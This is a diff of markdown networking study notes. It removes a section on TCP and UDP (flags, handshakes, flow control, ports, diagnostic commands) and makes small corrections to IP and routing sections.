-| Options | Variable | MSS, SACK, timestamps, window scaling |
-
-**Important Header/Path Relationships:**
-- **MSS (Maximum Segment Size):** Largest TCP payload per segment (announced in SYN options).
-- **MTU (Maximum Transmission Unit):** Largest Layer 3 packet size on a link.
-- **Typical Ethernet math:** MTU 1500 -> IPv4 header 20 + TCP header 20 => MSS 1460 bytes.
-- If TCP payload exceeds path MTU behavior, fragmentation or black-hole MTU issues can appear.
-
----
-
-#### 11.4.3 TCP Flags (Control Bits)
-
-TCP flags are 1-bit fields controlling connection state:
-
-| Flag | Full Name | Hex | Purpose |
-|------|-----------|-----|---------|
-| **URG** | Urgent | 0x20 | Urgent data present; urgent pointer valid |
-| **ACK** | Acknowledgment | 0x10 | Ack number field is valid |
-| **PSH** | Push | 0x08 | Push data to application immediately (no buffering) |
-| **RST** | Reset | 0x04 | Abort connection immediately |
-| **SYN** | Synchronize | 0x02 | Initiate connection; sync sequence numbers |
-| **FIN** | Finish | 0x01 | No more data from sender; graceful close |
-| **ECE** | ECN-Echo | -- | Congestion notification (RFC 3168) |
-| **CWR** | Congestion Window Reduced | -- | Sender reduced congestion window |
-
-**Common Flag Combinations:**
-
-| Flags | Meaning |
-|-------|---------|
-| SYN | Step 1 of handshake — connection request |
-| SYN + ACK | Step 2 of handshake — server accepts |
-| ACK | Acknowledgment of data received |
-| PSH + ACK | Push data immediately + acknowledge previous |
-| FIN + ACK | Graceful close initiation |
-| RST | Abrupt reset (port closed or error) |
-| RST + ACK | Abrupt reset in reply to a SYN |
-
-**Security Abuse of TCP Flags:**
-
-| Technique | Flag(s) | How It Works |
-|-----------|---------|--------------|
-| **SYN Flood** | SYN | Send thousands of SYNs without completing handshake — exhaust server's SYN_RCVD table |
-| **RST Injection** | RST | Forge RST packet — kill legitimate TCP session mid-flow |
-| **FIN Scan** (Nmap) | FIN | FIN to closed port — RST returned; stealthy port detection |
-| **XMAS Scan** | FIN+PSH+URG | All bits lit up; RFC-compliant closed ports return RST |
-| **NULL Scan** | (none) | No flags; closed ports return RST |
-| **ACK Scan** | ACK | Maps firewall rules: which ACKs get through? |
-| **Idle Scan** | SYN+ACK / RST | Uses zombie host's IP ID increments for completely silent port scan |
-
----
-
-#### 11.4.4 TCP Three-Way Handshake
-
-Before any data flows, TCP establishes a connection using a **three-way handshake** that synchronizes sequence numbers on both sides.
-
-```
-   Client                              Server
-     |                                   |
-     |--- SYN (seq=1000) --------------->|   Step 1: Client initiates
-     |                                   |
-     |<-- SYN-ACK (seq=5000, ack=1001) --|   Step 2: Server accepts + syncs
-     |                                   |
-     |--- ACK (ack=5001) --------------->|   Step 3: Client confirms
-     |                                   |
-     |======= Connection Established ====|
-     |                                   |
-     |--- DATA ------------------------->|   Data transfer begins
-```
-
-**Step 1 — SYN (Client to Server):**
-- SYN flag set; includes client's random **Initial Sequence Number (ISN)**
-- `SYN, seq=1000`
-- "I want to connect; my byte stream starts at 1000"
-
-**Step 2 — SYN-ACK (Server to Client):**
-- SYN + ACK flags set
-- ACK = client ISN + 1 (the SYN consumed one sequence number)
-- Includes server's own random ISN
-- `SYN-ACK, seq=5000, ack=1001`
-- "Accepted; my stream starts at 5000; I received your byte 1000"
-
-**Step 3 — ACK (Client to Server):**
-- ACK flag set; ACK = server ISN + 1
-- `ACK, ack=5001`
-- "I got your byte 5000; we are connected"
-
-**Why Randomize ISNs?**
-Prevents **TCP Sequence Prediction Attacks** where an off-path attacker guesses sequence numbers to inject data. RFC 6528 mandates cryptographically random ISN generation.
-
-**Connection States During Handshake:**
-
-| State | Who | Meaning |
-|-------|-----|---------|
-| LISTEN | Server | Awaiting incoming SYN |
-| SYN_SENT | Client | SYN sent, awaiting SYN-ACK |
-| SYN_RECEIVED | Server | SYN-ACK sent, awaiting final ACK |
-| ESTABLISHED | Both | Connection active; data flows freely |
-
-**Operational Hardening (Server Side):**
-- Enable **SYN cookies** where available to reduce SYN flood impact.
-- Tune backlog queues and monitor half-open connection rates.
-- Rate-limit abusive SYN sources at edge firewall/load balancer.
-
----
-
-#### 11.4.5 TCP Connection Termination (4-Way FIN Teardown)
-
-TCP uses a **4-way handshake** for graceful close. Either side can initiate.
-
-```
-   Client                              Server
-     |                                   |
-     |--- FIN (seq=u) ------------------>|   Step 1: Client done sending
-     |                                   |
-     |<-- ACK (ack=u+1) -----------------|   Step 2: Server acknowledges
-     |                                   |
-     |   [Server finishes its sending]   |
-     |                                   |
-     |<-- FIN (seq=v) -------------------|   Step 3: Server done sending
-     |                                   |
-     |--- ACK (ack=v+1) --------------->|    Step 4: Client acknowledges
-     |                                   |
-     |======= Connection Closed =========|
-```
-
-**TIME_WAIT State:**
-After the final ACK, the initiating side enters `TIME_WAIT` for **2 x MSL** (Maximum Segment Lifetime, ~60s). Purpose:
-- Ensures final ACK reaches the server
-- Prevents stale packets from corrupting new connections on the same port pair
-
-**Common Teardown-Related States (Practical):**
-- `FIN_WAIT_1` / `FIN_WAIT_2`: Side initiated close and waits for peer progression.
-- `CLOSE_WAIT`: Peer closed, local app still has not closed its socket.
-- `LAST_ACK`: Local side sent FIN and waits for final ACK.
-- Excessive `CLOSE_WAIT` often indicates application/socket handling bugs.
-
-**RST vs FIN:**
-
-| Method | Type | Use Case |
-|--------|------|---------|
-| FIN | Graceful | Normal close; finish buffered data |
-| RST | Abrupt | Error, refuse connection, force kill |
-
----
-
-#### 11.4.6 TCP Flow Control (Sliding Window)
-
-**Problem:** Sender transmits faster than receiver can process — buffer overflow and retransmissions.
-
-**Solution — Sliding Window:**
-Receiver advertises a **window size** = bytes it can currently accept. Sender keeps unacknowledged data within that window.
-
-```
-Sender view:
-[sent + acked] [sent, unacked] [can send now] [cannot send yet]
-               |<---  window  -->|
-```
-
-As the receiver processes data and ACKs arrive, the window slides forward allowing more bytes.
-
-**Window Scaling (RFC 1323):**
-- Base 16-bit field caps at 65,535 bytes
-- Window scale option (negotiated in SYN) multiplies by up to 2^14
-- Essential for high-bandwidth, high-latency links (satellite, transoceanic)
-
-**Flow Control vs Congestion Control (Critical Distinction):**
-- **Flow control (rwnd):** protects receiver buffers.
-- **Congestion control (cwnd):** protects the network path.
-- Sender can transmit up to: `min(rwnd, cwnd)` (minus bytes already in flight).
-
-**Bandwidth-Delay Product (BDP) Sizing:**
-- `BDP = bandwidth * RTT` (in bits).
-- Rule of thumb: effective window should be near BDP for full link utilization.
-- Example: 100 Mbps and RTT 50 ms -> BDP ~5,000,000 bits (~625 KB).
-
-**Zero Window (Attack Surface):**
-- Receiver sets `window=0` => sender must pause completely
-- Attacker can manipulate this to stall connections (Zero Window DoS)
-
----
-
-#### 11.4.7 TCP Congestion Control
-
-**Problem:** Network routers drop packets under load — TCP must detect and reduce send rate.
-
-| Algorithm | Behavior |
-|-----------|---------|
-| **Slow Start** | Begin with cwnd=1 MSS; double every RTT until ssthresh |
-| **Congestion Avoidance** | After ssthresh, increase cwnd by 1 MSS per RTT (linear) |
-| **Fast Retransmit** | 3 duplicate ACKs => retransmit immediately (no timeout wait) |
-| **Fast Recovery** | After fast retransmit: ssthresh = cwnd/2, re-enter avoidance |
-
-**Modern Algorithms:**
-
-| Algorithm | Default For | Characteristic |
-|-----------|------------|----------------|
-| TCP Reno | Classic | Standard congestion avoidance |
-| TCP CUBIC | Linux default | Better for high-speed / high-delay |
-| TCP BBR | Google services | Bottleneck-bandwidth based; lower latency |
-| QUIC (UDP-based) | Chrome / HTTP/3 | Implements own CC at application layer |
-
-**ECN (Explicit Congestion Notification):**
-- Lets routers signal congestion before drops (marks packets instead of dropping first).
-- TCP endpoints use ECE/CWR flags to react to ECN marks.
-- Reduces retransmission cost in some congested environments.
-
----
-
-#### 11.4.8 User Datagram Protocol (UDP)
-
-**Overview:**
-UDP is **connectionless, unreliable, and very fast**. No handshake, no ACK, no retransmission.
-
-**Core Philosophy:**
-- "Straight talk, no nonsense" transport: send now, recover at the application if needed.
-- No session state is established between sender and receiver.
-
-**Why UDP is still useful:**
-- Lower latency than TCP because setup/retransmission logic is skipped.
-- Small fixed header (8 bytes) leaves more room for payload.
-- In real-time traffic (VoIP, live streaming, gaming), stale data is often worse than dropped data.
-
-**UDP Segment Structure (8 bytes total):**
-
-```
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|          Source Port          |       Destination Port        |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|             Length            |            Checksum           |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|                          Payload Data                         |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-```
-
-| Field | Size | Description |
-|-------|------|-------------|
-| Source Port | 16 bits | Sender's port (optional; 0 if unused) |
-| Destination Port | 16 bits | Receiver's port |
-| Length | 16 bits | Total datagram length in bytes (header + data); min 8, max 65,535 |
-| Checksum | 16 bits | Error detection (optional in IPv4, mandatory in IPv6) |
-
-**Length and MTU note:**
-- UDP can carry up to 65,535 bytes at the IP level.
-- In practice, path MTU limits payload size (commonly around 1500-byte Ethernet MTU) unless fragmentation is used.
-- For performance-sensitive UDP apps, keep datagrams below path MTU to avoid fragmentation loss amplification.
-
-**Pseudo Header (for checksum calculation):**
-- UDP temporarily uses Source IP, Destination IP, and Protocol from IP to compute checksum.
-- This helps detect misdelivery to the wrong endpoint, not just bit errors in payload.
-
-| Feature | Description |
-|---------|------------|
-| Connection | Connectionless — zero handshake |
-| Reliability | None — no ACK, no retransmission |
-| Ordering | Packets may arrive out of order |
-| Speed | Very fast — minimal header overhead |
-| Header Size | 8 bytes (vs TCP's 20 to 60 bytes) |
-| Flow/Congestion Control | None at UDP layer; handled by app/protocol above UDP |
-| Broadcast/Multicast | Fully supported |
-| Use Cases | DNS, DHCP, VoIP, video streaming, gaming, TFTP, NTP |
-
-**Limitations:**
-- No continuous byte-stream abstraction; applications send discrete datagrams.
-- No built-in recovery for loss/reordering/duplication.
-- Under congestion, UDP datagrams may be dropped; apps must tolerate or recover.
-
-**Key Takeaway:**
-- UDP is like a sports car: lightweight and fast, ideal when latency matters more than perfection.
-- TCP is like an armored truck: heavier and slower, but designed for reliable delivery.
-
-**Concept Check:**
-- For a file transfer app (for example, sending a `.zip`), prefer TCP because losing even 1 byte can corrupt the file.
-
----
-
-#### 11.4.9 TCP vs UDP — Complete Comparison
-
-| Feature | TCP | UDP |
-|---------|-----|-----|
-| Connection model | Connection-oriented | Connectionless |
-| Reliability | Reliable (ACK + retransmit) | Unreliable |
-| Ordering | Guaranteed in-order delivery | Unordered |
-| Speed | Slower | Faster |
-| Header Size | 20 to 60 bytes | 8 bytes |
-| Flow Control | Yes (sliding window) | No |
-| Congestion Control | Yes | No |
-| Broadcast/Multicast | No | Yes |
-| Error Detection | Mandatory checksum | Checksum used for error detection (optional in IPv4, mandatory in IPv6) |
-| Handshake | 3-way SYN handshake | None |
-| Termination | 4-way FIN teardown | None |
-| Applications | HTTP/S, SSH, FTP, email, databases | DNS, VoIP, streaming, gaming, TFTP |
-| Wireshark Filter | `tcp` | `udp` |
-
-**Use TCP when:** Data integrity is critical, ordering matters, or you cannot tolerate loss.
-**Use UDP when:** Speed/latency is critical, or the application provides its own reliability (QUIC).
-
-**Decision Matrix (Quick):**
-
-| Requirement | Better Fit | Why |
-|-------------|------------|-----|
-| Exact, complete file delivery | TCP | Retransmission + ordering guarantee |
-| Real-time voice/video | UDP (or QUIC) | Freshness more important than perfect recovery |
-| Lossy links with app-level reliability | QUIC/UDP-based app | Recovery logic tuned at application level |
-| Simple request/response with tiny payload | UDP (case-dependent) | Lower setup overhead |
-
-**QUIC — The Modern Evolution:**
-- Built by Google; now IETF RFC 9000
-- Runs over **UDP** but implements reliable delivery, ordering, and TLS 1.3
-- Powers **HTTP/3** — the next-generation web protocol
-- 0-RTT or 1-RTT handshake (faster than TCP + TLS)
-- Eliminates head-of-line blocking at the transport layer
-
-**Concept Checks (Video-Aligned)**
-- **UDP file transfer check:** Should `.zip` transfer use UDP or TCP? Use **TCP** because even small loss can corrupt the file.
-- **Handshake math:** If client sends `SYN seq=1000`, server replies with `ACK=1001` in `SYN-ACK`.
-- **Seq/Ack math:** If a segment has `SEQ=1000` and length `50`, expected ACK is `1050` (or `1051` if counting from the next expected byte in one-based teaching examples).
-- **Buffer logic:** Sent-but-unACKed data must remain in sender buffer for potential retransmission.
-- **Error-control behavior:** If segment 2 is dropped and segments 3/4 arrive, receiver keeps sending duplicate ACK requesting segment 2; sender fast-retransmits after 3 duplicate ACKs.
-
----
-
-#### 11.4.10 Port Numbers
-
-**Definition:** A **port** is a 16-bit logical number (0 to 65535) that identifies a specific process/service on a host. Enables **multiplexing** — many simultaneous connections on one IP address.
-
-**Port Ranges:**
-
-| Range | Category | Notes |
-|-------|----------|-------|
-| 0 to 1023 | Well-known (System) | Assigned by IANA; require root/admin to bind |
-| 1024 to 49151 | Registered | Assigned for specific applications |
-| 49152 to 65535 | Dynamic / Ephemeral | Auto-assigned for client connections |
-
-**Critical Ports for Security:**
-
-| Port | Protocol | Service | Security Note |
-|------|----------|---------|--------------|
-| 21 | TCP | FTP | Credentials sent in plaintext |
-| 22 | TCP | SSH | Target for brute-force; keep updated |
-| 23 | TCP | Telnet | Completely unencrypted; do not use |
-| 25 | TCP | SMTP | Abuse for spam via open relays |
-| 53 | TCP/UDP | DNS | DNS tunneling / zone transfer abuse |
-| 80 | TCP | HTTP | Clear-text web; intercept/MITM |
-| 135 to 139 | TCP | NetBIOS | Legacy Windows exploitation |
-| 443 | TCP | HTTPS | TLS; verify certificate validity |
-| 445 | TCP | SMB | EternalBlue, WannaCry, lateral movement |
-| 3306 | TCP | MySQL | DB exposed to internet — disaster |
-| 3389 | TCP | RDP | BlueKeep, brute force, credential spray |
-| 5432 | TCP | PostgreSQL | Often misconfigured and exposed |
-| 6379 | TCP | Redis | Frequently deployed unauthenticated |
-| 27017 | TCP | MongoDB | Often world-readable by default |
-
-**Socket Address:**
-A **socket** uniquely identifies a connection endpoint: `IP_Address:Port`
-
-A TCP connection is uniquely identified by the **5-tuple:**
-```
-( Protocol, Source IP, Source Port, Destination IP, Destination Port )
-```
-
-Two clients connecting from different ephemeral ports to the same server port = two distinct connections.
-
-**NAT and Ephemeral Ports (Operations):**
-- Client-side ephemeral ports are usually NAT-translated at edge devices.
-- Large-scale systems can hit **ephemeral port exhaustion** under high short-lived connection churn.
-- Reuse, keep-alive strategy, and proper timeout tuning help reduce pressure.
-
-#### 11.4.11 Transport Layer Troubleshooting (Practical)
-
-**Fast Diagnosis Workflow:**
-1. Confirm listener and socket state (`LISTEN`, `ESTABLISHED`, `CLOSE_WAIT`, `TIME_WAIT`).
-2. Check handshake success/failure patterns (SYN, SYN-ACK, ACK).
-3. Verify retransmissions, duplicate ACKs, and window behavior.
-4. Check MTU/MSS mismatches and fragmentation symptoms.
-5. Correlate with firewall/NAT timeout behavior.
-
-**Useful Linux Commands:**
-
-```bash
-# Socket state and listening services
-ss -tuln
-
-# Active TCP connections with timers/state
-ss -tanp
-
-# Retransmission and stack counters
-netstat -s | grep -Ei 'retrans|listen|drops|reset'
-
-# Quick capture for a single service
-sudo tcpdump -i any -nn 'tcp port 443'
-
-# UDP traffic check (example DNS)
-sudo tcpdump -i any -nn 'udp port 53'
-```
-
-**High-Signal Wireshark Filters:**
-- `tcp.flags.syn == 1 && tcp.flags.ack == 0` -> new connection attempts
-- `tcp.analysis.retransmission` -> retransmitted segments
-- `tcp.analysis.duplicate_ack` -> duplicate ACK patterns
-- `tcp.window_size_value == 0` -> zero-window events
-- `udp && ip.frag_offset > 0` -> fragmented UDP behavior
-
-**Common Symptoms -> Likely Causes:**
-
-| Symptom | Likely Cause | First Check |
-|---------|--------------|-------------|
-| Many `SYN_SENT` connections | Upstream filtering/server unreachable | Firewall ACLs, route reachability |
-| Many `SYN_RECV` entries | SYN flood / incomplete handshakes | SYN cookies, backlog, source rate |
-| Repeated retransmissions | Loss/congestion/MTU issue | RTT/loss, PMTUD, interface errors |
-| Excessive `CLOSE_WAIT` | App not closing sockets | Application connection lifecycle |
-| UDP intermittent drop spikes | Congestion or oversized datagrams | Queue drops, MTU-safe payload size |
 
 [↑ Back to top](#table-of-contents)
 
@@ -6630,8 +6110,8 @@ After this section, you'll understand:
 | Address Format  | Decimal (dot)       | Hexadecimal (colon)        |
 | Example         | 192.168.1.1         | 2001:db8::1                |
 | Header Size     | 20-60 bytes         | 40 bytes                   |
-| Security        | Optional (IPsec)    | Mandatory (IPsec)          |
-| NAT             | Common              | Not needed                 |
+| Security        | Optional (IPsec)    | Built-in IPsec support (deployment optional) |
+| NAT             | Common              | Usually not required (but can still exist) |
 | Broadcast       | Yes                 | No (uses multicast)        |
 
 **Practical Note:**
@@ -6669,7 +6149,6 @@ A datagram is a self-contained, independent packet of data that carries enough i
 |                          Payload Data                         |
 |                              ...                              |
 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
--+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 ```
 
 **Header and Payload:**
@@ -6784,6 +6263,10 @@ The journey of an IP datagram from creation to delivery involves several critica
   - The Fragment Offset field indicates the position of the fragment’s data in the original datagram.
   - The More Fragments (MF) flag is set on all fragments except the last.
 - Each fragment is routed independently and may take different paths to the destination.
+
+**Path MTU Discovery (PMTUD) Note:**
+- Modern hosts try to avoid IPv4 fragmentation by setting DF and learning path MTU via ICMP feedback.
+- If ICMP "Fragmentation Needed" is filtered, PMTUD can fail (black-hole MTU), causing stalls/timeouts on larger packets.
 
 **Example: IP Fragmentation in Action**
 
@@ -6924,7 +6407,7 @@ IP is a network layer protocol that enables data to be sent from one computer to
 **TL;DR:** IP is the "thin waist" of the internet—simple, minimal, but powerful. Every packet has a header with source/destination IP, TTL, fragmentation info. TTL is used for traceroute; fragmentation can hide attacks; ICMP is used for diagnostics but is attack vector. Understanding IP header parsing is critical for penetration testing.
 
 - **IP is connectionless and unreliable by design** — Simplicity enabled scalability; TCP adds reliability on top
-- **TTL = Time To Live** — Decreamented at each hop; when reaches 0, packet discarded. Used for loop detection and traceroute attacks
+- **TTL = Time To Live** — Decremented at each hop; when reaches 0, packet discarded. Used for loop detection and traceroute behavior
 - **Fragmentation can hide attacks** — Fragment a malicious packet; IDS might not reassemble correctly; passes through
 - **ICMP for diagnostics (ping, traceroute) but also for attacks** — Ping of Death, Smurf attacks exploit ICMP
 - **IP header parsing = attack surface** — Malformed headers, option fields, weird flags all potential vulnerabilities
@@ -7438,7 +6921,7 @@ Note: NAT is commonly used to extend IPv4 address utility in private networks.
 
 ---
 
-#### 13.11.1 Distance Vector Routing (DVR)
+#### Distance Vector Routing (DVR)
 
 **Header Size:** Typically 24 bytes (RIP header; varies by protocol implementation)
 
@@ -7474,7 +6957,7 @@ $$
 ---
 
 
-#### 13.11.2 Link State Routing (LSR)
+#### Link State Routing (LSR)
 
 **Header Size:** OSPF LSA header is 20 bytes; OSPF packet header is 24 bytes
 
@@ -7503,7 +6986,7 @@ $$
 ---
 
 
-#### 13.11.3 Path Vector Routing (PVR)
+#### Path Vector Routing (PVR)
 
 **Header Size:** BGP UPDATE message header is 19 bytes; total BGP header is 19 bytes
 
@@ -7523,7 +7006,7 @@ $$
 ---
 
 
-#### 13.11.4 Hierarchical Routing & Autonomous Systems
+#### Hierarchical Routing & Autonomous Systems
 
 **Header Size:** Depends on protocol (e.g., OSPF, BGP, RIP); no fixed header size for hierarchy itself
 
@@ -7554,7 +7037,7 @@ $$
 ---
 
 
-#### 13.11.5 RIP (Routing Information Protocol)
+#### RIP (Routing Information Protocol)
 
 **Header Size:** 4 bytes (Command + Version + Unused fields); each entry is 20 bytes
 
@@ -7601,7 +7084,7 @@ $$
 ---
 
 
-#### 13.11.6 OSPF (Open Shortest Path First)
+#### OSPF (Open Shortest Path First)
 
 **Header Size:** 24 bytes (OSPF packet header); LSA header is 20 bytes
 
@@ -7652,7 +7135,7 @@ $$
 ---
 
 
-#### 13.11.7 BGP (Border Gateway Protocol)
+#### BGP (Border Gateway Protocol)
 
 **Header Size:** 19 bytes (BGP message header)
 
